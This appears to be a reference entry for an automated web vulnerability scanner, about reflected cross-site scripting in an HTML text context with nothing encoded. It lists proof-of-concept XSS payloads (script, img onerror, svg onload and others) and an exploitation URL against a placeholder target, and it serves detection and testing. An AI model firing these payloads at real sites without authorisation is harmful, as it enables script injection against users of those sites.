---
tags: xss, reflected, html-text, html-body, nothing-encoded, tier1
category: xss
---

# Reflected XSS — HTML Context (Nothing Encoded)

## Pattern

User input appears directly in HTML body with no encoding.

```html
GET /search?q=test
Response: <h1>You searched for: test</h1>
```

## Detection signal

Canary appears raw in response body inside a tag's text content.
`context = html_text` + `< in raw_chars`

## Working payloads (priority order)

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>
```

## Exploitation

```
URL: https://target.com/search?q=<img src=x onerror=alert(1)>
Expected: onerror fires immediately on page load
```

## What the scanner must confirm

- Raw payload appears in response body
- `content-type: text/html`
- No CSP blocking inline event handlers
- Browser renders and fires the event

